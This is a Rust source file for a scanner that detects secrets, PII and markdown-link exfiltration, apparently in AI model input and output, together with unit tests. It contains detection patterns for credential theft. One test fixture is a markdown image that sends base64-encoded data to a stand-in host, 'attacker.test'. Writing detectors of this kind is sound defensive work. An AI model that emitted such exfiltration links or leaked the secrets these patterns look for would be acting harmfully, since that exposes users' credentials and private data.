//! Exfiltration scanner: secrets (keys/tokens/JWT/PEM), PII (SSN, credit card
//! via Luhn, email), and markdown/link exfil on the output path.
//!
//! Precision-first by construction: secrets are matched by VALUE SHAPE (so a
//! variable literally named `apiKey` with no value, or the string
//! `AWS_SECRET_ACCESS_KEY`, does not fire). The bare 40-char AWS secret pattern
//! is proximity-gated and requires mixed case, so 40-hex git SHAs and UUIDs are
//! not mistaken for secrets. Generic entropy scanning is intentionally deferred
//! -- it is the main false-positive source and the specific shapes plus the
//! decode-then-rescan pass already cover the corpus.

use once_cell::sync::Lazy;
use regex::Regex;

use crate::markdown;
use crate::types::{Direction, Finding, Kind, Severity, Source};

struct Sig {
    re: Regex,
    label: &'static str,
    score: f64,
    sev: Severity,
}

static SIGS: Lazy<Vec<Sig>> = Lazy::new(|| {
    vec![
        Sig {
            re: Regex::new(r"AKIA[0-9A-Z]{16}").unwrap(),
            label: "aws_access_key",
            score: 0.95,
            sev: Severity::Critical,
        },
        Sig {
            re: Regex::new(r"gh[pousr]_[A-Za-z0-9]{20,}").unwrap(),
            label: "github_token",
            score: 0.95,
            sev: Severity::Critical,
        },
        // OpenAI/Anthropic keys. Two shapes, both requiring a long high-entropy
        // body so hyphenated identifiers ("sk-learn-classifier-module") do not
        // match: (1) the structured prefixes sk-ant-api03-/sk-proj- whose base64url
        // body may contain - and _, (2) a bare sk- (optionally sk-ant-) followed by
        // a 20+ contiguous alphanumeric run. The old `[A-Za-z0-9_-]{16,}` body let
        // short hyphen-joined words through.
        Sig {
            re: Regex::new(r"sk-(?:ant-api\d\d|proj)-[A-Za-z0-9_\-]{20,}").unwrap(),
            label: "llm_api_key",
            score: 0.95,
            sev: Severity::Critical,
        },
        Sig {
            re: Regex::new(r"sk-(?:ant-)?[A-Za-z0-9]{20,}").unwrap(),
            label: "llm_api_key",
            score: 0.95,
            sev: Severity::Critical,
        },
        Sig {
            re: Regex::new(r"AIza[0-9A-Za-z_\-]{35}").unwrap(),
            label: "google_api_key",
            score: 0.90,
            sev: Severity::High,
        },
        Sig {
            re: Regex::new(r"xox[baprs]-[A-Za-z0-9-]{10,}").unwrap(),
            label: "slack_token",
            score: 0.90,
            sev: Severity::High,
        },
        Sig {
            re: Regex::new(
                r"(?i)(postgres|postgresql|mysql|mongodb|redis|amqp|ftp)://[^\s:@/]+:[^\s:@/]+@",
            )
            .unwrap(),
            label: "credential_in_url",
            score: 0.85,
            sev: Severity::Critical,
        },
        Sig {
            re: Regex::new(r"eyJ[A-Za-z0-9_\-]{8,}\.eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{6,}")
                .unwrap(),
            label: "jwt",
            score: 0.80,
            sev: Severity::High,
        },
        Sig {
            re: Regex::new(r"-----BEGIN [A-Z ]{0,24}PRIVATE KEY-----").unwrap(),
            label: "private_key_pem",
            score: 0.95,
            sev: Severity::Critical,
        },
        Sig {
            re: Regex::new(r"\b\d{3}-\d{2}-\d{4}\b").unwrap(),
            label: "us_ssn",
            score: 0.80,
            sev: Severity::High,
        },
    ]
});

static EMAIL: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}").unwrap());
static AWS_SECRET: Lazy<Regex> = Lazy::new(|| Regex::new(r"[A-Za-z0-9/+]{40}").unwrap());
static CARD: Lazy<Regex> = Lazy::new(|| Regex::new(r"[0-9](?:[ -]?[0-9]){12,18}").unwrap());
static SSN: Lazy<Regex> = Lazy::new(|| Regex::new(r"\b\d{3}-\d{2}-\d{4}\b").unwrap());
static PHONE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"\(\d{3}\)\s*\d{3}-\d{4}|\b\d{3}-\d{3}-\d{4}\b|\b555-\d{4}\b").unwrap()
});
static DATE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\b(?:19|20)\d{2}-\d{2}-\d{2}\b|\b\d{2}/\d{2}/\d{4}\b").unwrap());
static ADDRESS: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"\b\d{1,5}\s+[A-Z][a-z]+\s+(?:Ave|Avenue|St|Street|Rd|Road|Blvd|Lane|Ln|Dr|Drive|Way)\b",
    )
    .unwrap()
});

fn luhn(digits: &[u8]) -> bool {
    let mut sum = 0u32;
    let mut alt = false;
    for &d in digits.iter().rev() {
        let mut x = d as u32;
        if alt {
            x *= 2;
            if x > 9 {
                x -= 9;
            }
        }
        sum += x;
        alt = !alt;
    }
    sum.is_multiple_of(10)
}

/// Scan `text` (already normalized) for exfiltration findings.
pub fn scan(text: &str, direction: Direction, source: Source) -> Vec<Finding> {
    let mut out = Vec::new();

    // Specific secret / PII shapes.
    for sig in SIGS.iter() {
        for m in sig.re.find_iter(text) {
            out.push(Finding::new(
                Kind::Exfiltration,
                sig.label,
                sig.sev,
                sig.score,
                (m.start(), m.end()),
                source,
            ));
        }
    }

    // AWS secret access key: a bare 40-char token is too generic on its own
    // (it would catch git SHAs and base64 ids), so require AWS context and
    // mixed case.
    let has_aws_ctx = text.contains("AKIA") || text.to_ascii_lowercase().contains("secret");
    if has_aws_ctx {
        for m in AWS_SECRET.find_iter(text) {
            let s = m.as_str();
            let mixed = s.chars().any(|c| c.is_ascii_uppercase())
                && s.chars().any(|c| c.is_ascii_lowercase());
            if mixed {
                out.push(Finding::new(
                    Kind::Exfiltration,
                    "aws_secret_key",
                    Severity::Critical,
                    0.90,
                    (m.start(), m.end()),
                    source,
                ));
            }
        }
    }

    // Credit card: digit run of the right length that passes the Luhn checksum,
    // and is not part of a longer digit string (which would be an id, not a PAN).
    for m in CARD.find_iter(text) {
        let (bs, be) = (m.start(), m.end());
        let prev_digit = text[..bs]
            .chars()
            .last()
            .is_some_and(|c| c.is_ascii_digit());
        let next_digit = text[be..]
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_digit());
        if prev_digit || next_digit {
            continue;
        }
        let digits: Vec<u8> = m
            .as_str()
            .bytes()
            .filter(u8::is_ascii_digit)
            .map(|b| b - b'0')
            .collect();
        if (13..=19).contains(&digits.len()) && luhn(&digits) {
            out.push(Finding::new(
                Kind::Exfiltration,
                "credit_card",
                Severity::High,
                0.85,
                (bs, be),
                source,
            ));
        }
    }

    // Email: weak PII signal -- recorded, but below the decision threshold so it
    // does not, by itself, flag the request.
    for m in EMAIL.find_iter(text) {
        out.push(Finding::new(
            Kind::Exfiltration,
            "email",
            Severity::Low,
            0.35,
            (m.start(), m.end()),
            source,
        ));
    }

    // PII cluster: two or more distinct PII signals together is a DLP-grade
    // leak even when no single one is decisive (email + phone + DOB, etc.).
    let mut pii_spans: Vec<(usize, usize)> = Vec::new();
    for re in [&*EMAIL, &*PHONE, &*DATE, &*ADDRESS, &*SSN] {
        if let Some(m) = re.find(text) {
            pii_spans.push((m.start(), m.end()));
        }
    }
    if pii_spans.len() >= 2 {
        let span = pii_spans.into_iter().min().unwrap_or((0, 0));
        out.push(Finding::new(
            Kind::Exfiltration,
            "pii_cluster",
            Severity::Medium,
            0.60,
            span,
            source,
        ));
    }

    // Markdown / URL exfiltration on the output path.
    out.extend(markdown::scan(text, direction, source));

    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn has(f: &[Finding], label: &str) -> bool {
        f.iter()
            .any(|x| x.label == label && x.kind == Kind::Exfiltration)
    }
    fn max_score(f: &[Finding]) -> f64 {
        f.iter().map(|x| x.score).fold(0.0, f64::max)
    }

    #[test]
    fn flags_aws_key_pair() {
        let f = scan(
            "key AKIAIOSFODNN7EXAMPLE and secret wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            Direction::Inbound,
            Source::User,
        );
        assert!(has(&f, "aws_access_key"));
        assert!(has(&f, "aws_secret_key"));
    }

    #[test]
    fn flags_tokens_and_pem() {
        assert!(has(
            &scan(
                "ghp_EXAMPLE0000000000000000000000000000",
                Direction::Inbound,
                Source::User
            ),
            "github_token",
        ));
        assert!(has(
            &scan(
                "sk-ant-EXAMPLE000000000000000000000000000000000000000000",
                Direction::Outbound,
                Source::ModelOutput
            ),
            "llm_api_key",
        ));
        assert!(has(
            &scan(
                "-----BEGIN PRIVATE KEY-----\nFAKEKEYFAKEKEY\n-----END PRIVATE KEY-----",
                Direction::Inbound,
                Source::User
            ),
            "private_key_pem",
        ));
    }

    #[test]
    fn flags_ssn_and_valid_card_only() {
        assert!(has(
            &scan("SSN 123-45-6789", Direction::Inbound, Source::User),
            "us_ssn"
        ));
        assert!(has(
            &scan("card 4111 1111 1111 1111", Direction::Inbound, Source::User),
            "credit_card"
        ));
        // One digit changed -> fails Luhn -> not a card.
        assert!(!has(
            &scan("num 4111 1111 1111 1112", Direction::Inbound, Source::User),
            "credit_card"
        ));
    }

    #[test]
    fn code_variable_name_is_not_a_secret() {
        let f = scan(
            "const apiKey = process.env.API_KEY;",
            Direction::Inbound,
            Source::User,
        );
        assert!(max_score(&f) < 0.5, "got {}", max_score(&f));
    }

    #[test]
    fn git_sha_is_not_a_secret() {
        let f = scan(
            "revert commit 9f1c2ad3b4e5f60718293a4b5c6d7e8f90123456 please",
            Direction::Inbound,
            Source::User,
        );
        assert!(max_score(&f) < 0.5, "got {}", max_score(&f));
    }

    #[test]
    fn markdown_exfil_flagged_outbound_but_allowlisted_is_clean() {
        let leak = scan(
            "![](https://attacker.test/log?d=QUtJQUlPU0ZPRE5ON0VYQU1QTEVERUFEQkVFRg==)",
            Direction::Outbound,
            Source::ModelOutput,
        );
        assert!(has(&leak, "markdown_image_exfil"));

        let benign = scan(
            "![logo](https://example.com/assets/logo.svg)",
            Direction::Outbound,
            Source::ModelOutput,
        );
        assert!(max_score(&benign) < 0.5);
    }

    #[test]
    fn flags_anthropic_key_with_hyphens() {
        assert!(has(
            &scan(
                "reuse sk-ant-api03-EXAMPLE00000000000000000000000000000000",
                Direction::Inbound,
                Source::User
            ),
            "llm_api_key",
        ));
    }

    #[test]
    fn hyphenated_identifier_is_not_a_key() {
        // Regression: the old `sk-(?:ant-)?[A-Za-z0-9_-]{16,}` body matched short
        // hyphen-joined words, redacting benign text.
        for s in [
            "install the sk-learn-classifier-module today",
            "branch sk-2026-q1-report-final-v2 is ready",
            "ant-colony-optimization in sk-ant-colony-demo-notebook",
        ] {
            let f = scan(s, Direction::Inbound, Source::User);
            assert!(!has(&f, "llm_api_key"), "false positive on {s:?}: {f:?}");
        }
    }

    #[test]
    fn flags_bare_and_project_keys() {
        assert!(has(
            &scan(
                "token sk-EXAMPLE00000000000000000000000000000000000000000000",
                Direction::Inbound,
                Source::User
            ),
            "llm_api_key",
        ));
        assert!(has(
            &scan(
                "token sk-proj-EXAMPLE000000000000000000000000-_aBcD",
                Direction::Inbound,
                Source::User
            ),
            "llm_api_key",
        ));
    }

    #[test]
    fn flags_connection_string_credentials() {
        assert!(has(
            &scan(
                "conn postgres://admin:hunter2@db.internal.test:5432/prod",
                Direction::Inbound,
                Source::User
            ),
            "credential_in_url",
        ));
    }

    #[test]
    fn pii_cluster_flags_email_plus_phone_plus_dob() {
        let f = scan(
            "Add to CRM: email alex@example.org, phone 555-0188, DOB 02/02/1992.",
            Direction::Inbound,
            Source::User,
        );
        assert!(has(&f, "pii_cluster"));
        assert!(max_score(&f) >= 0.5);
    }
}
